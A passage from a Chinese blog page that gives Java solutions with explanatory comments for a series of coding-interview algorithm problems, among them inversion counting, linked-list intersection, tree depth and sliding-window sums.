class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.get(str.charAt(i))==<span class="keyword">null</span>)&#123;</span><br><span class="line">                map.put(str.charAt(i),i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                map.put(str.charAt(i),-<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历key，找到那个第一个只出现一次的字符</span></span><br><span class="line">        <span class="keyword">for</span>(Character c:map.keySet())&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.get(c)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> map.get(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="35-数组中的逆序对"><a href="#35-数组中的逆序对" class="headerlink" title="35.数组中的逆序对"></a>35.数组中的逆序对</h3><h4 id="标签：【数组】-5"><a href="#标签：【数组】-5" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-34"><a href="#题目描述-34" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组,求出这个数组中的逆序对的总数P。并将P对1000000007取模的结果输出。 即输出P%1000000007</p><p>输入描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 题目保证输入的数组中没有的相同的数字数据范围：对于%50的数据,size&lt;=10^4对于%75的数据,size&lt;=10^5对于%100的数据,size&lt;=2*10^5</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>示例：</p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 1,2,3,4,5,6,7,0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 7</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="代码-34"><a href="#代码-34" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">InversePairs</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (array == <span class="keyword">null</span> || array.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> count;</span><br><span class="line">        &#125;</span><br><span class="line">        patition(array, <span class="number">0</span>, array.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">patition</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="comment">//划分子区间</span></span><br><span class="line">        patition(array, start, mid);</span><br><span class="line">        patition(array, mid + <span class="number">1</span>, end);</span><br><span class="line">        merge(array, start, mid, end);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//归并排序</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> start, <span class="keyword">int</span> mid, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = start;</span><br><span class="line">        <span class="keyword">int</span> j = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[end - start + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">if</span> (array[i] &lt;= array[j]) &#123;</span><br><span class="line">                temp[t++] = array[i++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                temp[t++] = array[j++];</span><br><span class="line">                <span class="comment">//计数，减少计算</span></span><br><span class="line">                count = count + mid - i + <span class="number">1</span>;</span><br><span class="line">                count = count % <span class="number">1000000007</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid) &#123;</span><br><span class="line">            temp[t++] = array[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (j &lt;= end) &#123;</span><br><span class="line">            temp[t++] = array[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//排序结果写入原数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; temp.length; k++) &#123;</span><br><span class="line">            array[start + k] = temp[k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="36-两个链表的第一个公共结点"><a href="#36-两个链表的第一个公共结点" class="headerlink" title="36.两个链表的第一个公共结点"></a>36.两个链表的第一个公共结点</h3><h4 id="标签：【链表】-5"><a href="#标签：【链表】-5" class="headerlink" title="标签：【链表】"></a>标签：【链表】</h4><h4 id="题目描述-35"><a href="#题目描述-35" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入两个链表，找出它们的第一个公共结点。（注意因为传入数据是链表，所以错误测试数据的提示是用其他方式显示的，保证传入数据是正确的）</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class ListNode &#123;</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    ListNode next = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">双指针法。创建两个指针p1和p2,分别指向两个链表的头结点，然后依次往后遍历。如果某个指针到达末尾，则将该指针指向另一个链表的头结点；如果两个指针所指的节点相同，则循环结束，返回当前指针指向的节点。比如两个链表分别为：1-&gt;3-&gt;4-&gt;5-&gt;6和2-&gt;7-&gt;8-&gt;9-&gt;5-&gt;6。短链表的指针p1会先到达尾部，然后重新指向长链表头部，当长链表的指针p2到达尾部时，重新指向短链表头部，此时p1在长链表中已经多走了k步(k为两个链表的长度差值)，p1和p2位于同一起跑线，往后遍历找到相同节点即可到达第一个公共结点。其实该方法主要就是用链表循环的方式替代了长链表指针先走k步这一步骤。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">FindFirstCommonNode</span><span class="params">(ListNode pHead1, ListNode pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead1 == <span class="keyword">null</span> || pHead2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode p1 = pHead1;</span><br><span class="line">        ListNode p2 = pHead2;</span><br><span class="line">        <span class="keyword">while</span> (p1 != p2) &#123;</span><br><span class="line">            p1 = p1== <span class="keyword">null</span> ? pHead2 : p1.next;</span><br><span class="line">            p2 = p2== <span class="keyword">null</span> ? pHead1 : p2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="37-数字在排序数组中出现的次数"><a href="#37-数字在排序数组中出现的次数" class="headerlink" title="37.数字在排序数组中出现的次数"></a>37.数字在排序数组中出现的次数</h3><h4 id="标签：【数组】-6"><a href="#标签：【数组】-6" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-36"><a href="#题目描述-36" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>统计一个数字在排序数组中出现的次数。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetNumberOfK</span><span class="params">(<span class="keyword">int</span> [] array , <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array==<span class="keyword">null</span> ||array.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//用Arrays.binarySearch二分查找出目标数字在有序数组的索引下标</span></span><br><span class="line">        <span class="keyword">int</span> index=Arrays.binarySearch(array,k);</span><br><span class="line">        <span class="comment">//不存在则返回应该插入的位置，如&#123;2,4,6&#125;，查找0返回-1，查找3返回-2，查找7返回-4，即返回</span></span><br><span class="line">        <span class="comment">//-（实际应插入数组位置+1）</span></span><br><span class="line">        <span class="keyword">if</span>(index&lt;=-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//统计右边相同的数字</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=index+<span class="number">1</span>;i&lt;array.length &amp;&amp;array[i]==k;i++)&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//统计左边相同的数字</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=index-<span class="number">1</span>;i&gt;=<span class="number">0</span> &amp;&amp;array[i]==k;i--)&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="38-二叉树的深度"><a href="#38-二叉树的深度" class="headerlink" title="38.二叉树的深度"></a>38.二叉树的深度</h3><h4 id="标签：【树】-2"><a href="#标签：【树】-2" class="headerlink" title="标签：【树】"></a>标签：【树】</h4><h4 id="题目描述-37"><a href="#题目描述-37" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一棵二叉树，求该树的深度。从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> * int val = 0;</span></span><br><span class="line"><span class="comment"> * TreeNode left = null;</span></span><br><span class="line"><span class="comment"> * TreeNode right = null;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment"> * this.val = val;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//深度优先递归</span></span><br><span class="line"><span class="comment">    public int TreeDepth(TreeNode root) &#123;</span></span><br><span class="line"><span class="comment">        if (null == root) &#123;</span></span><br><span class="line"><span class="comment">            return 0;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        int left = 0;</span></span><br><span class="line"><span class="comment">        int right = 0;</span></span><br><span class="line"><span class="comment">        if (root.left != null) &#123;</span></span><br><span class="line"><span class="comment">            left = TreeDepth(root.left);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if (root.right != null) &#123;</span></span><br><span class="line"><span class="comment">            right = TreeDepth(root.right);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return 1 + (left &gt;= right ? left : right);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//层次遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">TreeDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;TreeNode&gt; list = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        list.add(root);</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (list.size() != <span class="number">0</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">int</span> size = list.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode curr = list.remove();</span><br><span class="line">                <span class="keyword">if</span> (curr.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    list.add(curr.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (curr.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    list.add(curr.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="39-平衡二叉树"><a href="#39-平衡二叉树" class="headerlink" title="39.平衡二叉树"></a>39.平衡二叉树</h3><h4 id="标签：【树】-3"><a href="#标签：【树】-3" class="headerlink" title="标签：【树】"></a>标签：【树】</h4><h4 id="题目描述-38"><a href="#题目描述-38" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一棵二叉树，判断该二叉树是否是平衡二叉树。</p><p>在这里，我们只需要考虑其平衡性，不需要考虑其是不是排序二叉树</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">IsBalanced_Solution</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> deepth(root)!=-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">deepth</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left=deepth(root.left);</span><br><span class="line">        <span class="comment">//剪枝</span></span><br><span class="line">        <span class="keyword">if</span>(left==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> right=deepth(root.right);</span><br><span class="line">        <span class="comment">//剪枝</span></span><br><span class="line">        <span class="keyword">if</span>(right==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//不平衡</span></span><br><span class="line">        <span class="keyword">if</span>(Math.abs(left-right)&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (left&gt;right?left:right)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="40-数组中只出现一次的数字"><a href="#40-数组中只出现一次的数字" class="headerlink" title="40.数组中只出现一次的数字"></a>40.数组中只出现一次的数字</h3><h4 id="标签：【数组】-7"><a href="#标签：【数组】-7" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-39"><a href="#题目描述-39" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>一个整型数组里除了两个数字之外，其他的数字都出现了两次。请写程序找出这两个只出现一次的数字。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//num1,num2分别为长度为1的数组。传出参数</span></span><br><span class="line"><span class="comment">//将num1[0],num2[0]设置为返回结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  首先：位运算中异或的性质：两个相同数字异或=0，一个数和0异或还是它本身。当只有一个数出现一次时，我们把数组中所有的数，依次异或运算，最后剩下的就是落单的数，因为成对儿出现的都抵消了。依照这个思路，我们来看两个数（我们假设是AB）出现一次的数组。我们首先还是先异或，剩下的数字肯定是A、B异或的结果，这个结果的二进制中的1，表现的是A和B的不同的位。我们就取第一个1所在的位数，假设是第3位，接着把原数组分成两组，分组标准是第3位是否为1。如此，相同的数肯定在一个组，因为相同数字所有位都相同，而不同的数，肯定不在一组。然后把这两个组按照最开始的思路，依次异或，剩余的两个结果就是这两个只出现一次的数字。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">FindNumsAppearOnce</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> num1[], <span class="keyword">int</span> num2[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            res = res ^ array[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//此时res为这两个只出现一次的数异或的结果</span></span><br><span class="line">        <span class="keyword">int</span> temp = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//从低位到高位开始寻找这两个数不同的位，即res中为1的位</span></span><br><span class="line">        <span class="keyword">while</span> ((temp &amp; res) == <span class="number">0</span>) &#123;</span><br><span class="line">            temp = temp &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> one = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> two = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="comment">//根据这个指定位的不同，分成两类</span></span><br><span class="line">            <span class="keyword">if</span> ((array[i] &amp; temp) == <span class="number">0</span>) &#123;</span><br><span class="line">                one = one ^ array[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//根据这个指定位的不同，分成两类</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                two = two ^ array[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        num1[<span class="number">0</span>] = one;</span><br><span class="line">        num2[<span class="number">0</span>] = two;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="41-和为S的连续正数序列"><a href="#41-和为S的连续正数序列" class="headerlink" title="41.和为S的连续正数序列"></a>41.和为S的连续正数序列</h3><h4 id="标签：【穷举】-1"><a href="#标签：【穷举】-1" class="headerlink" title="标签：【穷举】"></a>标签：【穷举】</h4><h4 id="题目描述-40"><a href="#题目描述-40" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>小明很喜欢数学,有一天他在做数学作业时,要求计算出9~16的和,他马上就写出了正确答案是100。但是他并不满足于此,他在想究竟有多少种连续的正数序列的和为100(至少包括两个数)。没多久,他就得到另一组连续正数和为100的序列:18,19,20,21,22。现在把问题交给你,你能不能也很快的找出所有和为S的连续正数序列? Good Luck!</p><p>输出描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输出所有和为S的连续正数序列。序列内按照从小至大的顺序，序列间按照开始数字从小到大的顺序</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  滑动窗口法解连续区间和问题</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment"> * 1.什么是滑动窗口？顾名思义，首先是一个窗口，既然是一个窗口，就需要用窗口的左边界i和右边界j来唯一表示一    个窗口，其次，滑动代表，窗口始终从左往右移动，这也表明左边界i和右边界j始终会往后移动，而不会往左移动。</span></span><br><span class="line"><span class="comment"> * 2.滑动窗口的操作</span></span><br><span class="line"><span class="comment"> * 扩大窗口，j += 1</span></span><br><span class="line"><span class="comment"> * 缩小窗口，i += 1</span></span><br><span class="line"><span class="comment"> * 算法步骤：</span></span><br><span class="line"><span class="comment"> * （1）初始化，i=1,j=1, 表示窗口大小为0</span></span><br><span class="line"><span class="comment"> * （2）如果窗口中值的和小于目标值sum， 表示需要扩大窗口，j += 1</span></span><br><span class="line"><span class="comment"> * （3）否则，如果狂口值和大于目标值sum，表示需要缩小窗口，i += 1</span></span><br><span class="line"><span class="comment"> * （4）否则，等于目标值，存结果，缩小窗口，继续进行步骤2,3,4</span></span><br><span class="line"><span class="comment"> * 这里需要注意2个问题：</span></span><br><span class="line"><span class="comment"> * （1）什么时候窗口终止呢，这里窗口左边界走到sum的一半即可终止，因为题目要求至少包含2个数</span></span><br><span class="line"><span class="comment"> * （2）什么时候需要扩大窗口和缩小窗口？解释可看上述算法步骤。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    